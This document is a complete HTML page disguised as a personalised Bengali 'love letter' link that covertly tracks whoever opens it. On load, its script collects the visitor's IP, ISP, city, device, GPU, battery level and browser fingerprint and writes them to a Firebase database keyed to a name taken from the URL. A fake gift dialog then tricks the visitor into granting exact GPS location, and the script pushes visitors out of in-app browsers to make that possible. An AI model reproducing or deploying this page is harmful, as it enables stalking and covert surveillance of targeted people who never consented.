<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>FOR YOU</title>

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali:wght@400;600&family=Hind+Siliguri:wght@400;500;600&display=swap" rel="stylesheet" />

  <style>
    /* ─── RESET & DESIGN SYSTEM ───────────────────────────────── */
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    :root {
      --bg: #fdfbfd;
      --card-bg: #ffffff;
      --text: #1a0f16;
      --text-muted: #6b5966;
      --primary: #d14167;
      --border: #f5eef2;
    }

    html, body {
      min-height: 100%;
    }

    body {
      font-family: 'Hind Siliguri', sans-serif;
      background-color: var(--bg);
      color: var(--text);
      overflow-x: hidden;
    }

    /* ─── FULL-PAGE OVERLAY LAYOUT ──────────────────────────────── */
    #page-overlay {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100;
      background: var(--bg);
      padding: 12px;
      overflow-y: auto;
    }

    /* ─── LOADER ────────────────────────────────────────────────── */
    .loader-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    .heart-spinner {
      font-size: 50px;
      color: var(--primary);
      animation: heartBeat 1.2s infinite ease-in-out;
      margin-bottom: 15px;
    }

    .loader-text {
      font-size: 15px;
      color: var(--text-muted);
      font-weight: 500;
      letter-spacing: 0.05em;
    }

    @keyframes heartBeat {
      0%   { transform: scale(1); }
      25%  { transform: scale(1.15); }
      40%  { transform: scale(1); }
      60%  { transform: scale(1.15); }
      100% { transform: scale(1); }
    }

    /* ─── BROWSER REDIRECT DIALOG ─────────────────────────────── */
    .browser-redirect-overlay {
      position: fixed;
      inset: 0;
      background: rgba(26, 15, 22, 0.5);
      backdrop-filter: blur(5px);
      z-index: 400;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
    }

    .browser-redirect-overlay.show {
      opacity: 1;
      pointer-events: auto;
    }

    .browser-redirect-dialog {
      background: var(--card-bg);
      max-width: 340px;
      width: 100%;
      padding: 32px 24px;
      border-radius: 20px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      border: 1px solid var(--border);
      animation: slideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    @keyframes slideUp {
      from {
        transform: translateY(20px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    .redirect-icon {
      font-size: 45px;
      margin-bottom: 18px;
      display: inline-block;
    }

    .redirect-title {
      font-family: 'Noto Serif Bengali', serif;
      font-size: 18px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 10px;
    }

    .redirect-desc {
      font-size: 14px;
      color: var(--text-muted);
      line-height: 1.6;
      margin-bottom: 26px;
    }

    .redirect-btn {
      background: var(--primary);
      color: white;
      border: none;
      padding: 13px 28px;
      font-family: 'Hind Siliguri', sans-serif;
      font-size: 15px;
      font-weight: 600;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 4px 15px rgba(209, 65, 103, 0.3);
      transition: transform 0.2s, box-shadow 0.2s;
    }

    .redirect-btn:active {
      transform: scale(0.97);
    }

    .redirect-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    /* ─── CUSTOM LOCATION DIALOG BOX ─────────────── */
    .location-dialog-overlay {
      position: fixed;
      inset: 0;
      background: rgba(26, 15, 22, 0.4);
      backdrop-filter: blur(4px);
      z-index: 300;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s ease;
    }

    .location-dialog-overlay.show {
      opacity: 1;
      pointer-events: auto;
    }

    .location-dialog {
      background: var(--card-bg);
      max-width: 380px;
      width: 100%;
      padding: 30px 24px;
      border-radius: 24px;
      text-align: center;
      box-shadow: 0 15px 35px rgba(0,0,0,0.1);
      border: 1px solid var(--border);
      transform: scale(0.9);
      transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    .location-dialog-overlay.show .location-dialog {
      transform: scale(1);
    }

    .loc-icon {
      font-size: 40px;
      margin-bottom: 15px;
      display: inline-block;
      animation: pulse 2s infinite;
    }

    .loc-title {
      font-family: 'Noto Serif Bengali', serif;
      font-size: 20px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 12px;
    }

    .loc-desc {
      font-size: 14.5px;
      color: var(--text-muted);
      line-height: 1.6;
      margin-bottom: 24px;
    }

    .loc-btn {
      background: var(--primary);
      color: white;
      border: none;
      padding: 12px 32px;
      font-family: 'Hind Siliguri', sans-serif;
      font-size: 15px;
      font-weight: 600;
      border-radius: 50px;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 4px 15px rgba(209, 65, 103, 0.3);
      transition: transform 0.2s, opacity 0.2s;
    }

    .loc-btn:active {
      transform: scale(0.98);
    }

    .loc-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    /* ─── FULLSCREEN IFRAME ──────────────────────────────────────── */
    #full-iframe {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: none;
      display: none; 
      z-index: 200;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50%       { transform: scale(1.1); }
    }
  </style>
</head>
<body>

  <iframe id="full-iframe" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-geolocation"></iframe>

  <div id="page-overlay">
    <div id="loader" class="loader-container">
      <div class="heart-spinner">💖</div>
      <div class="loader-text">Please wait a moment...</div>
    </div>
  </div>

  <!-- ✅ NEW: Browser Redirect Dialog for TikTok/Messenger -->
  <div id="browser-redirect-overlay" class="browser-redirect-overlay">
    <div class="browser-redirect-dialog">
      <div class="redirect-icon">🌐</div>
      <div class="redirect-title">Open in Native Browser</div>
      <div class="redirect-desc">For the best experience and to access your location, please open this link in your default browser.</div>
      <button id="redirect-btn" class="redirect-btn">Open Now</button>
    </div>
  </div>

  <div id="location-overlay" class="location-dialog-overlay">
    <div class="location-dialog">
      <div class="loc-icon">🎁</div>
      <div class="loc-title">A message of love for you! 💌</div>
      <div class="loc-desc">Before reading the special love letter created for your area, please confirm your location by allowing it.</div>
      <button id="allow-loc-btn" class="loc-btn">View now</button>
    </div>
  </div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push, update, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

/* ✅ NEW: Detect if user is in TikTok or Messenger in-app browser */
function detectInAppBrowser() {
  const ua = navigator.userAgent.toLowerCase();
  
  const isTikTok = /tiktok|musical.ly/i.test(ua);
  const isMessenger = /fban|fbav|messenger/i.test(ua);
  const isInstagram = /instagram/i.test(ua);
  const isWhatsApp = /whatsapp/i.test(ua);
  const isWeChat = /wechat|micromessenger/i.test(ua);
  const isQQ = /qq\//i.test(ua);
  const isSnapchat = /snapchat/i.test(ua);
  
  return {
    isTikTok,
    isMessenger,
    isInstagram,
    isWhatsApp,
    isWeChat,
    isQQ,
    isSnapchat,
    isAnyInApp: isTikTok || isMessenger || isInstagram || isWhatsApp || isWeChat || isQQ || isSnapchat
  };
}

/* ✅ NEW: Redirect to native browser */
function redirectToNativeBrowser() {
  const url = window.location.href;
  const ua = navigator.userAgent.toLowerCase();
  
  // iOS এ Safari খুলতে
  if (/iphone|ipad|ipod/.test(ua)) {
    window.location.href = `safari-${url}`;
    setTimeout(() => {
      window.location.href = url; // ফেইলওভার
    }, 500);
  }
  // Android এ Chrome খুলতে
  else if (/android/.test(ua)) {
    const chromeUrl = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
    window.location.href = chromeUrl;
  }
}

function getNameFromURL() {
  const params = new URLSearchParams(window.location.search);
  let name = params.get('n') || params.get('name') || 'Unknown';
  return decodeURIComponent(name);
}

const firebaseConfig = {
  apiKey: "AIzaSyDs3buPka62aeOttWyKBaT7sEDotXVK5Zw",
  authDomain: "love-5585d.firebaseapp.com",
  databaseURL: "https://love-5585d-default-rtdb.firebaseio.com",
  projectId: "love-5585d",
  storageBucket: "love-5585d.firebasestorage.app",
  messagingSenderId: "435569951955",
  appId: "1:435569951955:web:863b3686c567c210e78026",
  measurementId: "G-2VZ27SZY2P"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

/* ── Global variables for new data ── */
window.pageLoadStart = performance.now();
window.clickCounter = 0;
window.jsErrors = [];
window.failedFetchURLs = [];
window.cumulativeLayoutShift = 0;
if(!sessionStorage.session_id) sessionStorage.session_id = crypto.randomUUID();
localStorage.visitCount = parseInt(localStorage.visitCount||0) + 1;

/* ── Event listeners ── */
document.addEventListener('click', ()=> window.clickCounter++);
window.onerror = (m,s,l)=> window.jsErrors.push(`${m} at ${s}:${l}`);
const oldFetch = window.fetch;
window.fetch = (...args) => {
  return oldFetch(...args).catch(err => {
    window.failedFetchURLs.push(args[0]);
    throw err;
  });
};

/* ── Parse device ── */
function parseDevice(ua) {
  let model = "Unknown Device";
  if (/iPhone/.test(ua)) model = ua.match(/iPhone[\w\s]*/)[0];
  else if (/iPad/.test(ua)) model = ua.match(/iPad[\w\s]*/)[0];
  else if (/Samsung/.test(ua)) model = ua.match(/Samsung[\w\s]*/)[0];
  else if (/Huawei/.test(ua)) model = ua.match(/Huawei[\w\s]*/)[0];
  
  let os = "Unknown OS";
  if (/Windows NT ([\d.]+)/.test(ua)) os = "Windows " + ua.match(/Windows NT ([\d.]+)/)[1];
  else if (/Android ([\d.]+)/.test(ua)) os = "Android " + ua.match(/Android ([\d.]+)/)[1];
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS " + ua.match(/OS ([\d_]+)/)[1].replace(/_/g,".");
  else if (/Mac OS X ([\d_]+)/.test(ua)) os = "macOS " + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,".");
  
  let browser = "Unknown Browser";
  if (/Chrome\/([\d.]+)/.test(ua) && !/Chromium|Edg|OPR/.test(ua)) browser = "Chrome";
  else if (/Firefox\/([\d.]+)/.test(ua)) browser = "Firefox";
  else if (/Safari\/([\d.]+)/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
  else if (/Edg\/([\d.]+)/.test(ua)) browser = "Edge";
  
  return { model, os, browser, type: /Mobi|Android|iPhone/i.test(ua) ? "Mobile" : "Desktop" };
}

/* ── GPU info ── */
function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { vendor: "N/A", renderer: "N/A" };
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    if (!dbg) return { vendor: "N/A", renderer: "N/A" };
    return { vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || "N/A", renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "N/A" };
  } catch (e) { return { vendor: "Error", renderer: "Error" }; }
}

/* ── Geo fetch ── */
async function fetchGeoData() {
  const apis = [
    { url: "https://ip-api.com/json/?fields=status,query,city,regionName,country,countryCode,isp", mapFunc: d => ({ ip: d.query, city: d.city, region: d.regionName, country_code: d.countryCode, isp: d.isp }) },
    { url: "https://ipwho.is/", mapFunc: d => ({ ip: d.ip, city: d.city, region: d.region, country_code: d.country_code, isp: d.connection?.isp || "N/A" }) },
    { url: "https://ipapi.co/json/", mapFunc: d => ({ ip: d.ip, city: d.city, region: d.region, country_code: d.country_code, isp: d.org || "N/A" }) },
    { url: "https://geolocation-db.com/json/", mapFunc: d => ({ ip: d.IPv4, city: d.city, region: d.state, country_code: d.country_code, isp: "N/A" }) }
  ];
  
  for (let apiObj of apis) {
    try {
      const res = await fetch(apiObj.url);
      const data = await res.json();
      if (data && (data.ip || data.query || data.IPv4)) {
        const result = apiObj.mapFunc(data);
        if (result.ip && result.ip !== "N/A") return result;
      }
    } catch (e) {}
  }
  return {ip:"N/A", city:"N/A", region:"N/A", country_code:"N/A", isp:"N/A"};
}

/* ── Show iframe ── */
function showIframeAndHideLoader() {
  const loader = document.getElementById("loader");
  const overlay = document.getElementById("page-overlay");
  const iframe = document.getElementById("full-iframe");
  if (loader) loader.style.display = "none";
  if (overlay) overlay.style.display = "none";
  if (iframe) iframe.style.display = "block";
}

/* ── Global Custom UI State ── */
let cachedHtmlContent = "";
function listenForCustomUI() {
  const uiRef = ref(db, "ui_config/custom_html");
  onValue(uiRef, (snapshot) => {
    cachedHtmlContent = snapshot.val() || "";
  });
}

/* ── ব্রাউজার থেকে রিয়েল এক্স্যাক্ট লোকেশন নেওয়া (দ্রুত) ── */
function requestExactLocation(visitorKey) {
  return new Promise((resolve) => {
    if ("geolocation" in navigator) {
      const startTime = Date.now();
      let resolved = false;
      
      // ৩ সেকেন্ডের পর ফোর্স করে রেজোলভ করো
      const timeoutId = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          console.warn("Location timeout after 3 seconds");
          update(ref(db, `visitors/${visitorKey}`), { 
            location_status: "Timeout",
            location_request_time: Date.now() - startTime + "ms"
          }).catch(err => console.error("Location Timeout Update Error:", err));
          resolve();
        }
      }, 3000);
      
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          if (resolved) return;
          resolved = true;
          clearTimeout(timeoutId);
          
          const requestTime = Date.now() - startTime;
          const exactGeo = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            location_accuracy: position.coords.accuracy + " meters",
            location_status: "Granted",
            location_request_time: requestTime + "ms"
          };
          try {
            await update(ref(db, `visitors/${visitorKey}`), exactGeo);
            console.log("✅ Location updated in " + requestTime + "ms");
          } catch (err) { console.error("Location Update Error:", err); }
          resolve();
        },
        async (error) => {
          if (resolved) return;
          resolved = true;
          clearTimeout(timeoutId);
          
          const requestTime = Date.now() - startTime;
          let reason = "Denied";
          if(error.code === error.POSITION_UNAVAILABLE) reason = "Unavailable";
          if(error.code === error.TIMEOUT) reason = "Timeout";
          
          try {
            await update(ref(db, `visitors/${visitorKey}`), { 
              location_status: reason,
              location_request_time: requestTime + "ms"
            });
          } catch (err) {}
          resolve();
        },
        { 
          enableHighAccuracy: false,
          timeout: 3000,
          maximumAge: 0
        }
      );
    } else {
      resolve();
    }
  });
}

/* ── Main Data Aggregator & Flow Management ── */
async function processVisitorFlow() {
  // ✅ CHECK FOR IN-APP BROWSER AT START
  const browserInfo = detectInAppBrowser();
  
  if (browserInfo.isAnyInApp) {
    // হাইড লোডার এবং রিডিরেক্ট ডায়ালগ দেখাও
    const loader = document.getElementById("loader");
    if (loader) loader.style.display = "none";
    
    const redirectOverlay = document.getElementById("browser-redirect-overlay");
    if (redirectOverlay) redirectOverlay.classList.add("show");
    
    const redirectBtn = document.getElementById("redirect-btn");
    if (redirectBtn) {
      redirectBtn.addEventListener("click", () => {
        redirectBtn.disabled = true;
        redirectBtn.textContent = "Redirecting...";
        redirectToNativeBrowser();
      });
    }
    return; // এখানেই থেমে যান, বাকি কোড এক্সিকিউট হবে না
  }

  // ─── যদি নেটিভ ব্রাউজার হয়, তাহলে স্বাভাবিক প্রক্রিয়া চলুক ───

  const pageLoadTime = window.performance ? Math.round(performance.now()) + " ms" : "N/A";
  const geoData = await fetchGeoData();
  const ua = navigator.userAgent;
  const device = parseDevice(ua);
  const conn = navigator.connection || {};
  const gpu = getGPUInfo();
  
  let batteryLevel = "N/A";
  let batteryCharging = "N/A";
  try {
    const bat = await navigator.getBattery();
    batteryLevel = Math.round(bat.level * 100) + "%";
    batteryCharging = bat.charging ? "Charging" : "Not Charging";
  } catch (e) {}

  const visitorData = {
    custom_label: getNameFromURL(),
    ip: geoData.ip,
    isp: geoData.isp,
    city: geoData.city,
    region: geoData.region,
    country_code: geoData.country_code,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
    device_model: device.model,
    device_type: device.type,
    os: device.os,
    browser: device.browser,
    screen: screen.width + "x" + screen.height,
    screen_orientation: screen.orientation ? screen.orientation.type : "N/A",
    color_depth: screen.colorDepth + " bit",
    touch_screen: ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
    dark_mode: window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No",
    cpu_cores: navigator.hardwareConcurrency || "N/A",
    device_memory: (navigator.deviceMemory || "N/A") + (navigator.deviceMemory ? " GB" : ""),
    gpu_vendor: gpu.vendor,
    gpu_renderer: gpu.renderer,
    language: navigator.language || "N/A",
    connection_type: conn.effectiveType || "N/A",
    downlink_speed: conn.downlink ? conn.downlink + " Mbps" : "N/A",
    network_rtt: conn.rtt ? conn.rtt + " ms" : "N/A",
    save_data: conn.saveData ? "Yes" : "No",
    page_load_speed: pageLoadTime,
    online_status: navigator.onLine ? "Online" : "Offline",
    battery_level: batteryLevel,
    battery_charging: batteryCharging,
    referrer: document.referrer || "Direct Link",
    page_url: window.location.href,
    page_title: document.title,
    updatedAt: serverTimestamp(),
    local_time: new Date().toLocaleString("en-BD"),
    user_agent: ua,
    location_status: "Prompted",
    
    time_on_page: Math.round((Date.now() - window.pageLoadStart)/1000) + "s",
    scroll_depth: Math.round(Math.max(window.scrollY / ((document.documentElement.scrollHeight - window.innerHeight)||1) * 100, 0)) + "%",
    click_count: window.clickCounter,
    utm_source: new URLSearchParams(window.location.search).get('utm_source') || "N/A",
    utm_campaign: new URLSearchParams(window.location.search).get('utm_campaign') || "N/A",
    session_id: sessionStorage.session_id,
    visit_count: parseInt(localStorage.visitCount),
    lcp: (window.largestContentfulPaint||0) + "ms",
    fid: (window.firstInputDelay||0) + "ms",
    cls: (window.cumulativeLayoutShift||0).toFixed(3),
    js_errors: window.jsErrors.length ? window.jsErrors.slice(-3).join(" | ") : "None",
    failed_requests: window.failedFetchURLs.length ? window.failedFetchURLs.slice(-3).join(" | ") : "None"
  };

  let activeKey = "";
  try {
    const existingKey = localStorage.getItem("hoor_toor_key");
    const savedLabel = localStorage.getItem("hoor_toor_label");
    const currentLabel = getNameFromURL();
    
    if (existingKey && savedLabel === currentLabel) {
      activeKey = existingKey;
      await update(ref(db, `visitors/${activeKey}`), visitorData);
    } else {
      const newRef = await push(ref(db, "visitors"), {...visitorData, createdAt: serverTimestamp()});
      activeKey = newRef.key;
      localStorage.setItem("hoor_toor_key", activeKey);
      localStorage.setItem("hoor_toor_label", currentLabel);
    }
  } catch (err) {
    console.error("Sync Error:", err);
  }

  const loader = document.getElementById("loader");
  if (loader) loader.style.display = "none";
  
  const dialogOverlay = document.getElementById("location-overlay");
  if (dialogOverlay) dialogOverlay.classList.add("show");

  const locBtn = document.getElementById("allow-loc-btn");
  if (locBtn) {
    locBtn.addEventListener("click", async () => {
      locBtn.disabled = true;
      locBtn.textContent = "Getting location...";
      
      if (dialogOverlay) dialogOverlay.classList.remove("show");
      if (loader) loader.style.display = "flex"; 
      
      await requestExactLocation(activeKey);
      
      const iframe = document.getElementById("full-iframe");
      if (iframe && cachedHtmlContent && cachedHtmlContent.trim() !== "") {
        iframe.srcdoc = cachedHtmlContent;
      }
      showIframeAndHideLoader();
    });
  }
}

/* ── Bootstrap ── */
window.addEventListener("load", () => {
  listenForCustomUI();
  processVisitorFlow();
  
  setTimeout(() => {
    const iframe = document.getElementById("full-iframe");
    if(iframe && (!iframe.srcdoc || iframe.style.display !== "block") && cachedHtmlContent) {
      iframe.srcdoc = cachedHtmlContent;
      showIframeAndHideLoader();
    }
  }, 10000);
});
</script>
